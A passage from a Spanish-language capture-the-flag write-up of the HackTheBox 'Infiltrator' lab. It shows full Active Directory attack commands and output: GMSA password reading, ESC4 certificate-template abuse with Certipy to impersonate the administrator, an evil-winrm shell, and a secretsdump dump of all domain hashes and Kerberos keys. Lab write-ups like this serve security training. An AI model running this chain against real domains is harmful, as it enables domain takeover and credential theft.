||turner@infiltrator.htb|turner|K.turner|48bcd1cdc870c6285376a990c2604531|aad3b435b51404eeaad3b435b51404ee|["48bcd1cdc870c6285376a990c2604531"]|
||rodriguez@infiltrator.htb|rodriguez|E.rodriguez|b1918c2ce6a62f4eee11c51b6e2e965a|aad3b435b51404eeaad3b435b51404ee|["b1918c2ce6a62f4eee11c51b6e2e965a"]|
sqlite>
```

```bash
lan_managment : l@n_M@an!1331
```
Verificamos que el par de credenciales que son aceptadas para este usuario.
```bash
❯ netexec smb 10.10.11.31 -u lan_managment -p 'l@n_M@an!1331'
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\lan_managment:l@n_M@an!1331 
❯
```

# User - infiltrator_svc
lan_managment puede realizar la lectura de la contrasena GMSA de infiltrator_svc$, logramos esto con netexec con la opcion `--gmsa`, donde observamos el hash NTLM de este usuario.
```bash
❯ netexec ldap 10.10.11.31 -u lan_managment -p 'l@n_M@an!1331' --gmsa
LDAP        10.10.11.31     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb)
LDAP        10.10.11.31     389    DC01             [+] infiltrator.htb\lan_managment:l@n_M@an!1331 
LDAP        10.10.11.31     389    DC01             [*] Getting GMSA Passwords
LDAP        10.10.11.31     389    DC01             Account: infiltrator_svc$     NTLM: 663675deae5af90402f1d53c8117cdaa     PrincipalsAllowedToReadPassword: lan_managment
❯
```

# Privesc
## ADCS
infiltrator_svc$ pertenece al grupo Certificate Service DCOM Access.

2025_20223282846.png[IMAGE]

Ejecutamos [certipy](https://github.com/ly4k/Certipy) para busqueda de plantillas vulnerables. En este caso se muestra la plantilla `Infiltrator_Template` como vulnerable a **ESC4**.
```bash
❯ certipy find -vulnerable -u infiltrator_svc$ -hashes 663675deae5af90402f1d53c8117cdaa -dc-ip 10.10.11.31 -ns 10.10.11.31 -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'infiltrator-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'infiltrator-DC01-CA'
[*] Checking web enrollment for CA 'infiltrator-DC01-CA' @ 'dc01.infiltrator.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : infiltrator-DC01-CA
    DNS Name                            : dc01.infiltrator.htb
    Certificate Subject                 : CN=infiltrator-DC01-CA, DC=infiltrator, DC=htb
    Certificate Serial Number           : 724BCC4E21EA6681495514E0FD8A5149
    Certificate Validity Start          : 2023-12-08 01:42:38+00:00
    Certificate Validity End            : 2124-08-04 18:55:57+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : INFILTRATOR.HTB\Administrators
      Access Rights
        ManageCa                        : INFILTRATOR.HTB\Administrators
                                          INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
        ManageCertificates              : INFILTRATOR.HTB\Administrators
                                          INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
        Enroll                          : INFILTRATOR.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : Infiltrator_Template
    Display Name                        : Infiltrator_Template
    Certificate Authorities             : infiltrator-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PendAllRequests
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Smart Card Logon
                                          Server Authentication
                                          KDC Authentication
                                          Client Authentication
    Requires Manager Approval           : True
    Requires Key Archival               : False
    Authorized Signatures Required      : 1
    Schema Version                      : 2
    Validity Period                     : 99 years
    Renewal Period                      : 650430 hours
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-05-27T06:05:56+00:00
    Template Last Modified              : 2025-05-27T06:05:57+00:00
    Permissions
      Object Control Permissions
        Owner                           : INFILTRATOR.HTB\Local System
        Full Control Principals         : INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
                                          INFILTRATOR.HTB\Local System
        Write Owner Principals          : INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
                                          INFILTRATOR.HTB\Local System
        Write Dacl Principals           : INFILTRATOR.HTB\Domain Admins
                                          INFILTRATOR.HTB\Enterprise Admins
                                          INFILTRATOR.HTB\Local System
    [+] User ACL Principals             : INFILTRATOR.HTB\infiltrator_svc
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
❯
```
## ESC4 Exploit
Realizamos la explotacion de [ESC4](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc4-template-hijacking) a esta plantilla iniciando con el cambio de configuracion a vulnerable.
```bash
❯ certipy template -u infiltrator_svc$ -hashes 663675deae5af90402f1d53c8117cdaa -dc-ip 10.10.11.31 -ns 10.10.11.31 -template 'Infiltrator_Template' -write-default-configuration
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'Infiltrator_Template.json'
[*] Wrote current configuration for 'Infiltrator_Template' to 'Infiltrator_Template.json'
[*] Updating certificate template 'Infiltrator_Template'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIOverlapPeriod: b'\x00\x80\xa6\n\xff\xde\xff\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     msPKI-RA-Signature: 0
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'Infiltrator_Template'? (y/N): y
[*] Successfully updated 'Infiltrator_Template'
❯
```

Tras realizar el cambio obtuvimos el SID de Administrator.
```bash
*Evil-WinRM* PS C:\programdata\temp> Get-ADUser -Identity administrator -Properties SID | Select-Object SID

SID
---
S-1-5-21-2606098828-3734741516-3625406802-500


*Evil-WinRM* PS C:\programdata\temp>
```
Con el valor de SID solicitamos un certificado como administrador a la plantilla vulnerable.
```bash
❯ certipy req -u infiltrator_svc$ -hashes 663675deae5af90402f1d53c8117cdaa -dc-ip 10.10.11.31 -ns 10.10.11.31 -ca infiltrator-DC01-CA -target dc01.infiltrator.htb -template Infiltrator_Template -upn administrator@infiltrator.htb -sid S-1-5-21-2606098828-3734741516-3625406802-500
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 9
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@infiltrator.htb'
[*] Certificate object SID is 'S-1-5-21-2606098828-3734741516-3625406802-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
❯
```
Realizamos la autenticacion con el certificado anterior logrando obtener el hash de Administrator.
```bash
❯ certipy auth -pfx 'administrator.pfx' -dc-ip 10.10.11.31
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@infiltrator.htb'
[*]     SAN URL SID: 'S-1-5-21-2606098828-3734741516-3625406802-500'
[*]     Security Extension SID: 'S-1-5-21-2606098828-3734741516-3625406802-500'
[*] Using principal: 'administrator@infiltrator.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@infiltrator.htb': aad3b435b51404eeaad3b435b51404ee:1356f502d2764368302ff0369b1121a1
❯
```

```bash
# Commands
# ESC4 for Infiltrator -> Infiltrator_Template
certipy template -u infiltrator_svc$ -hashes 663675deae5af90402f1d53c8117cdaa -dc-ip 10.10.11.31 -ns 10.10.11.31 -template Infiltrator_Template -write-default-configuration
certipy req -u infiltrator_svc$ -hashes 663675deae5af90402f1d53c8117cdaa -dc-ip 10.10.11.31 -ns 10.10.11.31 -ca infiltrator-DC01-CA -target dc01.infiltrator.htb -template Infiltrator_Template -upn administrator@infiltrator.htb -sid S-1-5-21-2606098828-3734741516-3625406802-500
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.31
```
## Shell
Con evil-winrm y el hash de administrador logramos obtener una shell y la flag `root.txt`.
```bash
❯ evil-winrm -i dc01.infiltrator.htb -u administrator -H 1356f502d2764368302ff0369b1121a1
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
infiltrator\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
6182542a9ab0e9a14c2095f21000523e
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## Dump Hashes
Realizamos un dump de las hashes con `secretdump`.
```bash
❯ secretsdump.py administrator@infiltrator.htb -hashes :1356f502d2764368302ff0369b1121a1
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xb69149edc42a85733e4efe5e35a33e87
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4dc8e10f3a29237b05bdfdb5bded5451:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
INFILTRATOR\DC01$:aes256-cts-hmac-sha1-96:15db1652b02a83f4324bd8ba4f2a20eb8ea7631bf87dfec2d4f97ebeff32435d
INFILTRATOR\DC01$:aes128-cts-hmac-sha1-96:70d8ad0059f5e81f43310c34e9937556
INFILTRATOR\DC01$:des-cbc-md5:80fe9dbfa22531ab
INFILTRATOR\DC01$:plain_password_hex:0a3183391dac772712b98e94fead3b9456bfedcc57c953d18084f50e94cf42d6c08434a1d3217c2fe151916a0ae7867c415ab8d3546f4ecc4707410ca56e2556aef2298066f7842ec1ad4819706032c10db5d22ff762c9a4fdeb82405627c04ed0ae8ee0514170acb1f0fa8964a2d045ba16b749ef89933bccd53b25a8aa0f5d17c2d519f9aa7a939b1fb9701bb88a1abb5efdfbcd02226e09032d8ffced8801e6cf8adf16bceb1491482d23a8281326cc82a6fa06425336d1422cd3b1cadd389263a9f557ce5221a86b28a71dc6276a0ac8165b7c5c5929dd3998130bbd7b9e41b9a8e4d69e1b7a614f25b6a8aa672b
INFILTRATOR\DC01$:aad3b435b51404eeaad3b435b51404ee:c4d8ecef85fdd70a87fa9c8da56a417f:::
[*] DefaultPassword 
INFILTRATOR\Administrator:Infiltrator_Box1337!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xbd8a15f7e24918ac40db6b340498aeda032c4fc0
dpapi_userkey:0xf0f81997f3c057103ab87ac71dc986c455880e83
[*] NL$KM 
 0000   A9 F8 C1 38 F1 FB 53 1A  E1 12 CA 8A 61 D3 C1 D6   ...8..S.....a...
 0010   67 09 77 BC BC C6 BC 2F  5D E3 18 3D 66 DB 6D 9F   g.w..../]..=f.m.
 0020   03 30 80 2D 25 9F 69 56  39 55 EA A3 50 D0 CA 0F   .0.-%.iV9U..P...
 0030   C6 18 45 14 9E 8E B6 3C  46 49 6F 3B FA EF FE 89   ..E....<FIo;....
NL$KM:a9f8c138f1fb531ae112ca8a61d3c1d6670977bcbcc6bc2f5de3183d66db6d9f0330802d259f69563955eaa350d0ca0fc61845149e8eb63c46496f3bfaeffe89
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1356f502d2764368302ff0369b1121a1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d400d2ccb162e93b66e8025118a55104:::
infiltrator.htb\D.anderson:1103:aad3b435b51404eeaad3b435b51404ee:627a2cb0adc7ba12ea11174941b3da88:::
infiltrator.htb\L.clark:1104:aad3b435b51404eeaad3b435b51404ee:627a2cb0adc7ba12ea11174941b3da88:::
infiltrator.htb\M.harris:1105:aad3b435b51404eeaad3b435b51404ee:3ed8cf1bd9504320b50b2191e8fb7069:::
infiltrator.htb\O.martinez:1106:aad3b435b51404eeaad3b435b51404ee:daf40bbfbf00619b01402e5f3acd40a9:::
infiltrator.htb\A.walker:1107:aad3b435b51404eeaad3b435b51404ee:f349468bb2c669ec8c3fd4154fdfe126:::
infiltrator.htb\K.turner:1108:aad3b435b51404eeaad3b435b51404ee:a119c0d5af383e9591ebb67857e2b658:::
infiltrator.htb\E.rodriguez:1109:aad3b435b51404eeaad3b435b51404ee:b02e97f2fdb5c3d36f77375383449e56:::
infiltrator.htb\winrm_svc:1601:aad3b435b51404eeaad3b435b51404ee:120c6c7a0acb0cd808e4b601a4f41fd4:::
infiltrator.htb\lan_managment:8101:aad3b435b51404eeaad3b435b51404ee:a1983d156e1d0fdf9b01208e2b46670d:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:c4d8ecef85fdd70a87fa9c8da56a417f:::
infiltrator_svc$:3102:aad3b435b51404eeaad3b435b51404ee:4bc37a35b66f6ea51e478ca5473d4e59:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d9ae321762ce3d90ff7835a9e9a8fe453bcc3b35c0cb212326e0efb2e8b29ba
Administrator:aes128-cts-hmac-sha1-96:762b10a1e2296a49bab7da1ce32755ed
Administrator:des-cbc-md5:0497041f3e5d2598
krbtgt:aes256-cts-hmac-sha1-96:673c00e9dd5ca94e9be6312a159fc1c4e2ef95792ec45f867ec2c1ad439f3150
krbtgt:aes128-cts-hmac-sha1-96:674de1e736dbefda6f24dd914e598d79
krbtgt:des-cbc-md5:a4b9c73bc4a46bcd
infiltrator.htb\D.anderson:aes256-cts-hmac-sha1-96:42447533e9f1c9871ddd2137def662980e677a748b5d184da910d3c4daeb403f
infiltrator.htb\D.anderson:aes128-cts-hmac-sha1-96:021e189e743a78a991616821138e2e69
infiltrator.htb\D.anderson:des-cbc-md5:1529a829132a2345
infiltrator.htb\L.clark:aes256-cts-hmac-sha1-96:dddc0366b026b09ebf0ac3e7a7f190b491c4ee0d7976a4c3b324445485bf1bfc
infiltrator.htb\L.clark:aes128-cts-hmac-sha1-96:5041c75e19de802e0f7614f57edc8983
infiltrator.htb\L.clark:des-cbc-md5:cd023d5d70e6aefd
infiltrator.htb\M.harris:aes256-cts-hmac-sha1-96:90dd4ed523ecc25972afe0b133cad79d5c5b88e6bc5cd1a8d2920ccb45b15596
infiltrator.htb\M.harris:aes128-cts-hmac-sha1-96:bf1e51ae7fa659e146833d8de8ff3d17
infiltrator.htb\M.harris:des-cbc-md5:7fabf8e6e5678a67
infiltrator.htb\O.martinez:aes256-cts-hmac-sha1-96:d497f5a48df0dd55d34c79c7893867a3aad8b222dc7f41af67a1476735c9ed75
infiltrator.htb\O.martinez:aes128-cts-hmac-sha1-96:a062fd39eee45a7ceea3f8e5b7525d10
infiltrator.htb\O.martinez:des-cbc-md5:70f8164a9713ba8c
infiltrator.htb\A.walker:aes256-cts-hmac-sha1-96:cbaeaefb06f17d3eb1d49550e5714fbdf517922c841375cd6a6cd750aa5e3efe
infiltrator.htb\A.walker:aes128-cts-hmac-sha1-96:27b89dea58e7a98cfadc60b2af7ab568
infiltrator.htb\A.walker:des-cbc-md5:a4515dd5d09be9b9
infiltrator.htb\K.turner:aes256-cts-hmac-sha1-96:0f75078e57f71485606fef572b36a278645e2053438e8596c48be7e41e56055a
infiltrator.htb\K.turner:aes128-cts-hmac-sha1-96:fb14214da9c033aa04c0d559abbd3f7a
infiltrator.htb\K.turner:des-cbc-md5:b94a5d234307459b
infiltrator.htb\E.rodriguez:aes256-cts-hmac-sha1-96:52c2444473f775e05ba01744af63901249a018ade7369a262981ce3aeede220a
infiltrator.htb\E.rodriguez:aes128-cts-hmac-sha1-96:9988b989a3d40045326f8908094a79be
infiltrator.htb\E.rodriguez:des-cbc-md5:2f013eea29c7f237
infiltrator.htb\winrm_svc:aes256-cts-hmac-sha1-96:61f308b54f3b17ed48c2877c775a6aa37789b46c1741e356f6fcdab75373d1ca
infiltrator.htb\winrm_svc:aes128-cts-hmac-sha1-96:1d454266ab84bfe7ce7bb03e48a23ac7
infiltrator.htb\winrm_svc:des-cbc-md5:01ce70109ecea73b
infiltrator.htb\lan_managment:aes256-cts-hmac-sha1-96:e66b410341a87c4f1ff382e9c4e3e26d0a351de2ebea9ba0d234b7713cfb0ce6
infiltrator.htb\lan_managment:aes128-cts-hmac-sha1-96:5bf2b52baf80470a2dfe5466c44e9896
infiltrator.htb\lan_managment:des-cbc-md5:b6044c94896e57f1
DC01$:aes256-cts-hmac-sha1-96:15db1652b02a83f4324bd8ba4f2a20eb8ea7631bf87dfec2d4f97ebeff32435d
DC01$:aes128-cts-hmac-sha1-96:70d8ad0059f5e81f43310c34e9937556
DC01$:des-cbc-md5:fb2954402cd32f5e
infiltrator_svc$:aes256-cts-hmac-sha1-96:56e0aa473964e0dbc481fc783373842de1cb383fc8171164e9e6849338c277a9
infiltrator_svc$:aes128-cts-hmac-sha1-96:b23d807863adc3b3dcb5a594535c879c
infiltrator_svc$:des-cbc-md5:ef52681ca2a72fc1
[*] Cleaning up... 
❯
```
